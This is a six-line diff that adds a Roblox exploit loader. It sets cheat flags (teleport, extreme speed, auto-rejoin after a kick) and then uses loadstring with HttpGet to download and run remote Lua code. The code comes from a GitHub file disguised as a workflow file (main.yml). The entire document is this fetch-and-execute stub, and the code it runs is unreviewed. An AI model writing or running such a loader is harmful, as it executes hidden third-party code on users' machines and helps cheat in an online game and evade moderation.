@@ -1,0 +1,6 @@
+getgenv().TP = true
+getgenv().speed = 99999999999999999999
+getgenv().AutoRejoin = true -- Automatically rejoins when you kicked
+getgenv().delay = 0
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Nguyenvu2k23/autolily/main/.github/workflows/main.yml", true))()
